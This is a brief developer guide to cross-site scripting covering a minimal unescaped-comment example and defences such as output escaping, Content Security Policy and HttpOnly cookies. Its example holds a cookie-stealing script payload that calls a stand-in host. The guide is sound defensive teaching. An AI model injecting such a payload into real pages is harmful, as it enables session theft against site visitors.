**Cross-Site Scripting (XSS)** happens when an attacker gets their own JavaScript to execute inside a page under a *different, trusted* origin — meaning that script runs with the same access to cookies, DOM, and API calls a legitimate script on that page would have. It's not a bug in the browser; it's a failure to keep untrusted data from being interpreted as code.

## A minimal example

If a page renders a comment like this without escaping it:

```html
<div>{{ comment }}</div>
```

and a comment contains `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`, every visitor who views that comment runs the attacker's script — under the site's own origin, with access to that site's cookies (unless [`HttpOnly`](/en/security/sessions) is set).

## What actually stops it

- **Escaping output** — encoding user-controlled data before it's inserted into HTML, so `<script>` becomes literal text (`&lt;script&gt;`) instead of a tag. Most modern frameworks (React, Vue) do this by default, which is why manually bypassing it (`dangerouslySetInnerHTML`, `v-html`) deserves extra scrutiny.
- **Content Security Policy** — even if malicious markup gets through, a strict [CSP](/en/security/content-security-policy) can block inline scripts from executing at all.
- **`HttpOnly` cookies** — don't stop the script from running, but stop it from being able to read session cookies even if it does.
